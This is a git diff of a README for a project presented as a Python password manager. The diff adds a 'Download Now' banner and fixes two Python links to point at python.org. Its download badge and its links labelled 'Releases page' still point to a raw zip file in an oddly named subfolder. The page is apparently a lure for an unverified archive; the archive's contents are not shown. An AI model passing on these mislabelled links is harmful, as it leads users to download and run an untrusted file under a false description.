@@ -1,5 +1,9 @@
 # 🔑 password_manager - Secure Your Passwords with Ease
 
+<p align="center">
+  <img src="https://i.imgur.com/BQcuJbR.png" alt="Download Now" width="250">
+</p>
+
 [![Download](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
 
 ## 🚀 Getting Started
@@ -31,7 +35,7 @@ Before you download, make sure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any distribution of Linux.
 - **RAM**: At least 1 GB.
 - **Storage**: At least 100 MB of free space.
-- **Python**: The application requires Python 3.6 or later installed on your system.
+- **Python**: The application requires Python 3.6 or later installed on your system. You can download Python from the [official website](https://www.python.org/downloads/).
 
 ## 🔒 Features
 
@@ -63,14 +67,14 @@ If you encounter issues while using the **password_manager**, try the following:
 
 - **Reinstall the App**: Uninstall the application and re-download it from the [Releases page](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip).
   
-- **Check Python Installation**: Make sure you have the correct version of Python installed. You can download Python from the [official website](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip).
+- **Check Python Installation**: Make sure you have the correct version of Python installed. You can download Python from the [official website](https://www.python.org/downloads/).
 
 - **Reach Out for Help**: If problems persist, check the Issues tab in this repository or open a new issue describing your problem.
 
 ## 🔗 Helpful Links
 
 - [Check the Releases page for updates](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
-- [Python Downloads](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
+- [Python Downloads](https://www.python.org/downloads/)
 
 ## 📜 License
 
